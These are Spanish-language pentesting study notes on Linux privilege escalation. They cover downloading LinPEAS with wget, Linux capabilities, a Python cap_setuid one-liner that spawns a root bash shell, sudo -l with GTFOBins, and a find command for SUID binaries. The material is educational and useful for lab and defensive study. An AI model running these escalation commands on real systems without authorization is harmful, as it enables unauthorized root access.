
## LinPEAS

Para encontrar vectores automáticamente sin buscar comando por comando:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

--- 

# Linux Capabilities

**Linux capabilities** son un mecanismo de seguridad del kernel de Linux que divide los privilegios tradicionales del superusuario (`root`, UID 0) en unidades pequeñas, granulares e independientes.

Su objetivo es cumplir con el **principio de mínimo privilegio**: en lugar de darle a un programa o proceso acceso total como `root` solo para que haga una tarea específica, se le concede únicamente la *capability* exacta que necesita.

## Python Capability (`cap_setuid`)

Si se muestra esto en la búsqueda de capabilities con python, sabes que puede ser vulnerable al cambiar el ID:

```bash
usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### Explotación / Vulnerar

Para vulnerarlo y cambiar el ID utilizamos este comando, así nos volveremos `root`:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```



---

# sudo -l

Este comando nos sirve para poder ver cuales son los comandos que estan permitidos en el usuario actual, si nos dice que podemos ejecutar algun comando que esta con un binario podemos ir a la pagina de GTObins para poder vulerarlos

```bash
sudo -u {usuario} {comando}
```

---

# Binarios SUID

```bash
find / -perm -4000 2>/dev/null
```

Cuando ejecutamos ese comando podemos ver los binarios que tengan SUID activados y podremos ejecutar estos bianrios con el permiso del propietario, para ello hay que encontrar binarios que no sea habitual encontrarselos